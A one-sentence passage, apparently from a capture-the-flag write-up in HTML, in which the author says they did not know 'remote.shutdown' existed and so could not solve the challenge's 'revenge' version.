 I didn&rsquo;t know that <code>remote.shutdown</code> existed so I was unable to solve the revenge version.</p>
